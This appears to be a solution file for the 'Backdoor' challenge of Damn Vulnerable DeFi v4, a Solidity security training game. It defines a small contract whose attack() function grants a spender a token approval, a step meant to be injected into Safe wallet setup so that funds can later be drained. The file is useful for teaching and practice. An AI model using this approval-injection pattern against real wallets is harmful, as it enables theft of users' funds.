// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";

contract Backdoor {
      address public immutable token;
      address public immutable spender;

      constructor(address _token, address _spender) {
          token = _token;
          spender = _spender;
      }

      function attack() external {
          DamnValuableToken(token).approve(spender, 10e18);
      }
  }